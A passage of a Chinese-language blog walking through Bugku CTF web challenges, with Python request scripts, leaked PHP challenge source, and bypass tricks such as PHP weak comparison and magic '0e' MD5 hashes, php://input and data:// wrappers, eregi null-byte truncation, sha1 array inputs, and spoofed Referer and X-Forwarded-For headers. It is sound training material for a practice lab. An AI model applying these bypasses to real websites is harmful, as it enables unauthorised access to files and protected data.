<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&#x27;http://123.206.87.240:8002/qiumingshan/&#x27;</span></span><br><span class="line">session = requests.session()</span><br><span class="line">a = re.findall(<span class="string">&#x27;&lt;div&gt;([0-9+*-]*)?&#x27;</span>, session.get(url).text)</span><br><span class="line"><span class="comment">#因为re.findall返回的是一个列表，所以我们查看一下列表的内容</span></span><br><span class="line">print(<span class="string">&quot;页面的计算式子：&quot;</span>,a[<span class="number">0</span>],<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">b = eval(a[<span class="number">0</span>])</span><br><span class="line">c = &#123;<span class="string">&quot;&quot;</span>:b&#125;</span><br><span class="line">result = session.post(url,c)</span><br><span class="line">print(result.text)</span><br></pre></td></tr></table></figure>
<p>先解释一下脚本，用session保持一个会话状态，免得下次post出去的时候就是另一个计算值了，然后用正则匹配页面内容div后面的数字和±*三种运算符，后面的表示匹配全部，?表示非贪婪匹配，用eval计算我们的式子。</p>
<p>首先我们给一个空的对象传计算的值测试测试，因为我们也不知道给谁传值</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA/J%5D8U%28%5BUYQ9CQO95MUC%28FXRX.png" alt=""></p>
<p>返回页面结果，提示我们给value传值，ok，那我们在字典上再填上value</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&#x27;http://123.206.87.240:8002/qiumingshan/&#x27;</span></span><br><span class="line">session = requests.session()</span><br><span class="line">a = re.findall(<span class="string">&#x27;&lt;div&gt;([0-9+*-]*)?&#x27;</span>, session.get(url).text)</span><br><span class="line"><span class="comment">#因为re.findall返回的是一个列表，所以我们查看一下列表的内容</span></span><br><span class="line">print(<span class="string">&quot;页面的计算式子：&quot;</span>,a[<span class="number">0</span>],<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">b = eval(a[<span class="number">0</span>])</span><br><span class="line">c = &#123;<span class="string">&quot;value&quot;</span>:b&#125;</span><br><span class="line">result = session.post(url,c)</span><br><span class="line">print(result.text)</span><br></pre></td></tr></table></figure>
<p>看看结果</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA/4JCI7%255O%60Q849KFX9M9%24V_B.png" alt=""></p>
<p>拿到flag，下一关下一关！！！</p>
</li>
<li>
<h2 id="速度要快"><a class="header-anchor" href="#速度要快">¶</a>速度要快</h2>
<p>打开页面</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/8%40T~%7B%7D%607N0E4JJ%29JV%24K%40SWT.png" alt=""></p>
<p>让我们快点，好，那我就用burpsuite搞一下你</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/%29EHX4V~L3USH7W%5B4%606%40M_WX.png" alt=""></p>
<p>发现响应头有flag，flag后面数据被base64加密了，我们去解决一下</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/G%40K%28U69GOE7I7X%60U2%7DZX6ZJ.jpg" alt=""></p>
<p>好家伙，还有一串base64加密的数据，那我们再解一遍</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/P%24O581JD%5BGRO%7B%7B%24VPO6Y9RH.jpg" alt=""></p>
<p>题目提示我们flag的格式，所以我们去按照格式提交一下</p>
<p>…emm答案不正确</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/MOJS0I82%60U3GCO7%7BC%29O%7D4GA.jpg" alt=""></p>
<p>后面发现每次提交一次包，返回的flag都不一样</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/%7D%7DI~3MYXK%40AK%40L71HFANWR4.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/N9PFS22WWSK9~VW_2F_%409WP.jpg" alt=""></p>
<p>被演了一手，注意到返回的数据提示我们需要post发送margin，应该是发送数据margin:解密后的flag。但再次发送后还是回显“我感觉你得快点”</p>
<p>那我直接上脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">&#x27;http://123.206.87.240:8002/web6/&#x27;</span></span><br><span class="line">se = requests.session()</span><br><span class="line">flag = se.get(url).headers[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">flag = base64.b64decode(flag).decode()<span class="comment">#多加个decode(),是因为上一步生成的是bytes类型，要转换成string</span></span><br><span class="line">flag = base64.b64decode(flag.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>]) </span><br><span class="line">go = &#123;<span class="string">&#x27;margin&#x27;</span>:flag&#125;</span><br><span class="line">print(se.post(url,data=go).text)</span><br></pre></td></tr></table></figure>
<p>然后得到flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/O1%24UM%29LIER5PAGC7OFY%29_TN.png" alt=""></p>
<p>还是解释一波脚本吧，首先使用session保持一个会话状态，然后得到返回的响应头中的flag那一条数据。经过第一次base64解密，然后取解密出来的那一串字符串中的‘：’后面的那一串base64加密的数据进行解密，最后发送一个post数据包，打印出文本信息。</p>
</li>
<li>
<h2 id="cookies欺骗"><a class="header-anchor" href="#cookies欺骗">¶</a>cookies欺骗</h2>
<p>打开页面，是一大串没有用的字符串(因为尝试解密了N次…)</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/8J9PK_S4VX%7DW%29W7U0RRO%25DO.png" alt=""></p>
<p>有注意到filename参数后面跟的是一串base64编码，去解密一下</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/8J9PK_S4VX%7DW%29W7U0RRO%25DO.png" alt=""></p>
<p>解密得到keys.txt，应该这是个突破点，访问一下index.php，注意要先进行base64编码，按照它的方式传参。</p>
<p>index.php经过base64编码后为：aW5kZXgucGhw</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/PAAJKTHIOF1TTDZHYHWDZ%7BV.png" alt=""></p>
<p>在源代码中发现有点有用的信息，这时候把视线再转移到另一个参数line。前面只显示&lt;?php，并不全，猜测可能是line控制显示的行数</p>
<p>我们尝试更改line的值</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/FQ%5B4IHZ%5BWK82R5C%29FQFGKQ9.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/88L4Y%7D0_M%28WV~LM%7BE%2968F%25I.png" alt=""></p>
<p>确认line参数控制显示的行数了，我们写个python脚本跑一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">lines = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(lines):</span><br><span class="line">    url = <span class="string">&quot;http://123.206.87.240:8002/web11/index.php?line=&quot;</span>+str(i)+<span class="string">&quot;&amp;filename=aW5kZXgucGhw&quot;</span></span><br><span class="line">    res = requests.get(url).text</span><br><span class="line">    print(res)</span><br></pre></td></tr></table></figure>
<p>跑完得到完整的源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])?$_GET[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	$line=<span class="keyword">isset</span>($_GET[<span class="string">&#x27;line&#x27;</span>])?intval($_GET[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($file==<span class="string">&#x27;&#x27;</span>) header(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line"></span><br><span class="line">	$file_list = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">	<span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"></span><br><span class="line">	<span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line">	$file_list[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line"></span><br><span class="line">	$fa = file($file);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> $fa[$line];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看来需要传参cookie，并且margin=margin才能访问keys.php文件</p>
<p>keys.php经过base64编码为：a2V5cy5waHA=</p>
<p>我们发送一下包</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/2~FY~%5BQJ0HS%5B~JJTVR4F%5BDU.png" alt=""></p>
<p>在源码中找到flag啦~</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/cookies%E6%AC%BA%E9%AA%97/06ITHFL5I%5D%24GG%7B%7BQZIQ%254TU.png" alt=""></p>
</li>
<li>
<h2 id="never-give-up"><a class="header-anchor" href="#never-give-up">¶</a>never give up</h2>
<p>打开页面告诉我们不要放弃</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/never%20give%20up/RN9TL~G5NVGREJ2P1~4SW_T.png" alt=""></p>
<p>查看一下源码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/never%20give%20up/8TN%7BV%40S90DH0UP%25JC%5BPH%40%5B1.png" alt=""></p>
<p>提示我们有1p.html文件，我们去访问一下</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/never%20give%20up/D9P%290%2482%60R9_Z99FV%24UC3JN.png" alt=""></p>
<p>发现我们被重定向到https://www.bugku.com/</p>
<p>用view-source查看一下源码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/never%20give%20up/BU%5BB1%29%7DJEE6AUKVTM%255%5DQZ6.png" alt=""></p>
<p>看见Words用经过了url编码，去解密一下</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/never%20give%20up/1T%5D3K47GRNIAD83BXL%5DFMKP.png" alt=""></p>
<p>还有一串base64编码过的数据，再去解密一下base64</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/never%20give%20up/GK%60TTFC%5B3%7BA9V%40XIWL%7BXGE5.png" alt=""></p>
<p>还剩一层url编码，我们再解一遍url</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/never%20give%20up/M%28S7~6JS88E96NAC%60P%29Q_B9.png" alt=""></p>
<p>解密后得到源码，拼凑起来就是下面这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;www.bugku.com&#39;;&lt;&#x2F;script&gt; </span><br><span class="line">&lt;!--&quot;;if(!$_GET[&#39;id&#39;])</span><br><span class="line">&#123;</span><br><span class="line">	header(&#39;Location: hello.php?id&#x3D;1&#39;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$b&#x3D;$_GET[&#39;b&#39;];</span><br><span class="line">if(stripos($a,&#39;.&#39;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &#39;no no no no no no no&#39;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data &#x3D; @file_get_contents($a,&#39;r&#39;);</span><br><span class="line">if($data&#x3D;&#x3D;&quot;bugku is a nice plateform!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4)</span><br><span class="line">&#123;</span><br><span class="line">	require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;--&gt;</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
<blockquote>
<p>解释一波代码：</p>
<p>1.首先限制id必须为非零非空</p>
<p>2.一共需要传参a,b,id三个参数</p>
<p>3.匹配a中是否有.这个符号</p>
<p>4.读取变量a的值到data中，用了file_get_contents函数，所以a的值必须为数据流</p>
<p>5.判断data等于字符串&quot;bugku is a nice plateform!&quot;，id==0，b的长度要大于5</p>
<p>6.字符串1114要与字符串111连接变量b的第一个字符构成正则匹配，而且b的第一个字符不能为4</p>
</blockquote>
<p>好，那我们要采用什么姿势绕过呢？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对于参数id，因为是&#x3D;&#x3D;弱类型比较，可以使用0abc之类的绕过，因为0abc&#x3D;&#x3D;比较为0</span><br><span class="line"></span><br><span class="line">对于参数a，因为是读取数据流，我们可以使用php协议中的input，即php:&#x2F;&#x2F;input，它可以访问请求的原始数据的只读流，所以我们用post发送数据&quot;bugku is a nice plateform!&quot;</span><br><span class="line"></span><br><span class="line">对参数b，我们可以使用空字符对付它。因为eregi()函数存在空字符截断漏洞，当参数中的待匹配字符串或者正则表达式遇到空字符则截断，会丢弃后面的数据。我们可以构造%0012345。这里%00是空格经过url编码后的形式，值得注意的是，这里是一共6个长度。</span><br></pre></td></tr></table></figure>
<p>好，我们去试试吧</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/never%20give%20up/S%5BR1_E5%25%5DYA_LKG%28RSZ_VE6.png" alt=""></p>
<p>成功绕过拿到flag了。</p>
<p>其实，这里有个问题，就是源码中并没有限制我们访问f4l2a3g.txt文件，只是告诉我们可以通过这种构造方式访问。</p>
<p>所以我们可以直接访问得到flag，这也是一个思维点，我觉得。</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/never%20give%20up/P%5DHY~JA4DCBADUQYCEJCT%28X.png" alt=""></p>
</li>
<li>
<h2 id="welcome-to-bugkuctf"><a class="header-anchor" href="#welcome-to-bugkuctf">¶</a>welcome to bugkuctf</h2>
<p>题目挂掉，暂时跳过</p>
</li>
<li>
<h2 id="过狗一句话"><a class="header-anchor" href="#过狗一句话">¶</a>过狗一句话</h2>
<p>题目还是挂了，flag被删除，跳过</p>
</li>
<li>
<h2 id="字符？正则？"><a class="header-anchor" href="#字符？正则？">¶</a>字符？正则？</h2>
<p>打开页面，给出一串php代码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F/GUB%7D33H%7BYS%29_%2410R4TS%24CK8.png" alt=""></p>
<p>看到有函数preg_match，它的功能为用正则表达式匹配字符串，匹配成功返回1，并把匹配到的值赋值给match，否则返回0。最后有一个if判断，也就是我们上边匹配成功，即可输出flag。</p>
<p>好，思路很清晰，就是匹配正则表达式~</p>
<p>题目中的正则表达式为：/key.*key.{4,7}key:/./(.*key)[a-z][[:punct:]]/i</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key  		普通字符key</span><br><span class="line">. 			除了换行符之外的任意字符，.*匹配0个或多个正则表达式</span><br><span class="line">key  		普通字符key</span><br><span class="line">.&#123;4,7&#125;		4个到7个除了换行符之外的任意字符(包括4，不包括7)</span><br><span class="line">key  		普通字符key</span><br><span class="line">:    		普通字符:</span><br><span class="line">\&#x2F;   		这里的\为转义字符,也就是表示&#x2F;</span><br><span class="line">.			除了换行符之外的任意字符</span><br><span class="line">\&#x2F;   		这里的\为转义字符,也就是表示&#x2F;</span><br><span class="line">.			除了换行符之外的任意字符，.*匹配0个或多个正则表达式</span><br><span class="line">key  		普通字符key</span><br><span class="line">[a-z]		匹配a到z之间的字符</span><br><span class="line">[:punct:]	表示匹配 !&quot;#$%&amp;’()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;&#123;|&#125;~.中的任意一个</span><br><span class="line">i		    表示忽略大小写</span><br></pre></td></tr></table></figure>
<p>这里我构造成：<code>http://123.206.87.240:8002/web10?id=keykey....key:/./keya:</code></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F/0KY3%28S%7BG868TM%299FQ%7D%24%24%25%28T.png" alt=""></p>
<p>成功拿到flag！</p>
</li>
<li>
<h2 id="前女友-SKCTF"><a class="header-anchor" href="#前女友-SKCTF">¶</a>前女友(SKCTF)</h2>
<p>好吧，题目又是挂的，gg</p>
</li>
<li>
<h2 id="login1-SKCTF"><a class="header-anchor" href="#login1-SKCTF">¶</a>login1(SKCTF)</h2>
<p>不会吧，阿sir，又是挂的题</p>
</li>
<li>
<h2 id="你从哪里来"><a class="header-anchor" href="#你从哪里来">¶</a>你从哪里来</h2>
<p>终于是道能访问的题了，不容易。</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/A8_%606DQ%7B0%40UT%60%243KCV%294LHX.png" alt=""></p>
<p>提示我们要从谷歌访问，于是抓个包改包，加referer头</p>
<p>referer:<code>https://www.google.com</code></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/2U%7B0ZAM%24%5DIVCR%5D7XCG3~0%7DF.png" alt=""></p>
<p>啊这，flag就出来了？太简单了。。。</p>
</li>
<li>
<h2 id="md5-collision-NUPT-CTF"><a class="header-anchor" href="#md5-collision-NUPT-CTF">¶</a>md5 collision(NUPT_CTF)</h2>
<p>打开页面，提示我们输入a</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/md5%20collision%28NUPT_CTF%29/~%60%405THX%7B429ORPTH6GR2MQ1.png" alt=""></p>
<p>试试get输入？</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/md5%20collision%28NUPT_CTF%29/P617F2S%7DE5Q4XCQXYT9I%40%293.png" alt=""></p>
<p>应该可能是要输入题目提示的md5，然后进行一个绕过。</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/md5%20collision%28NUPT_CTF%29/UN%60%7DE0VCT4%7DRUHMKX6H1UCJ.png" alt=""></p>
<p>flag爆出来了。猜测源码应该是用a传进来的md5值和它源码的另一个md5值进行比较。这里再说明一下，php处理哈希字符串时，会利用!=或者==进行一个比较，每一个&quot;0E&quot;开头的哈希值都会被解释成0。因此两个&quot;0E&quot;开头的哈希值会被php认为相等。</p>
<p>这里记录一下一些使用0e开头的md5和原值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li>
<h2 id="程序员本地网站"><a class="header-anchor" href="#程序员本地网站">¶</a>程序员本地网站</h2>
<p>打开页面，提示我们从本地访问</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99/H%7BV6G1KGD14%29HAGV8B7WCHL.png" alt=""></p>
<p>那我们就抓包加个xff头，X-Forwarded-For:127.0.0.1</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99/%5DJCHINA92U0KSN0A%7BW%244YW6.png" alt=""></p>
<p>flag就出来了</p>
</li>
<li>
<h2 id="各种绕过"><a class="header-anchor" href="#各种绕过">¶</a>各种绕过</h2>
<p>这次是给我们代码，通过绕过进行获取flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87/7R%5BB3%290OA%5B%7BSATZJ8L%7BTLAX.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">$_GET[<span class="string">&#x27;id&#x27;</span>] = urldecode($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">$flag = <span class="string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;uname&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;uname&#x27;</span>] == $_POST[<span class="string">&#x27;passwd&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;passwd can not be uname.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">&#x27;uname&#x27;</span>]) === sha1($_POST[<span class="string">&#x27;passwd&#x27;</span>])&amp;($_GET[<span class="string">&#x27;id&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.$flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;sorry!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>总的看下来，需要我们通过get提交参数id和参数uname，还有通过post提交一个passwd参数</p>
<p>第一个if判断，判断是否提交uname和passwd</p>
<p>第二个if判断，uname的值和passwd的值一样就输出提示，所以我们这里两个参数的值不能一样</p>
<p>第三个if判断，sha1()函数是用来计算字符串的SHA-1散列，这里要求经过sha1函数处理的两个值一样并且参数id等于margin，即可输出flag</p>
<p>我们可以用数组来进行绕过sha1函数，因为sha1函数无法处理数组，会返回false。两个false，条件就成立了，就可以绕过。</p>
<p>所以我们这么构造一下</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87/KGYCCZ52%25%28F%7DD%24R%24~XQX2G2.png" alt=""></p>
<p>flag出来了，姿势使用对了。</p>
</li>
<li>
<h2 id="web8"><a class="header-anchor" href="#web8">¶</a>web8</h2>
<p>打开，首先是一波代码审计<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web8/%24O9CMJNNH%248%28%7B0R90%28F_%40NO.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输出flag需要满足下面几个条件：</span><br><span class="line">1.get传值的ac参数不为空</span><br><span class="line">2.参数f的值从文件fn中获取</span><br><span class="line">3.参数ac需要满足等于参数f</span><br></pre></td></tr></table></figure>
<p>所以我们可以使用php伪协议进行构造<br>
第一种方法，使用php://input协议</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web8/D%5DHZ9FHB%5BG8X~TW%5DP5X%60CIJ.png" alt=""></p>
<p>第二种方法，使用data://text/plain协议</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web8/K28D7J0%5D%24JR6S41%7BWB%29%5BPL8.png" alt=""></p>
<p>补充：</p>
<p>因为一直对题目的txt提示感到疑惑，想着可能file_get_contents读取的文件是存在的，后面乱试了一通index.txt，fn.txt<br>
ac.txt…flag.txt，发现是存在一个flag.txt</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web8/D%28BU2~CWBAOBQWP%60TVAE0AN.png" alt=""></p>
<p>然后可以构造取得flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web8/%7BYUA%25%7B9%7D6W7UY%24%29PU3TDGMP.png" alt=""></p>
</li>
<li>
<h2 id="细心"><a class="header-anchor" href="#细心">¶</a>细心</h2>
<p>打开是一个404页面<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BB%86%E5%BF%83/OK6R%5BVSY%5B%7B0AL215GT2GR%245.png" alt=""><br>
心头一动，莫非又是一道挂掉的题？？！<br>
但和之前挂的题有点不一样，用御剑扫一下<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BB%86%E5%BF%83/9%60S0%5B9Z%24~~7CR%5D1EBN3PTTO.png" alt=""><br>
扫出一个robots.txt，访问一波<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BB%86%E5%BF%83/TRVX_OR7BM_%5D30%28%29W%7BSF%5BDW.png" alt=""><br>
还有个resusl.php页面，打开<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BB%86%E5%BF%83/MON_0I~~NX9G%60%25I%5B7%29%7D~LBA.png" alt=""><br>
提示我们需要管理员，页面还有个get传值，那我们试试传值x=admin<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BB%86%E5%BF%83/HZ%7B%5B_AJ5_VG%7DZBSEA4%2921NK.png" alt=""><br>
flag出来了！</p>
</li>
<li>
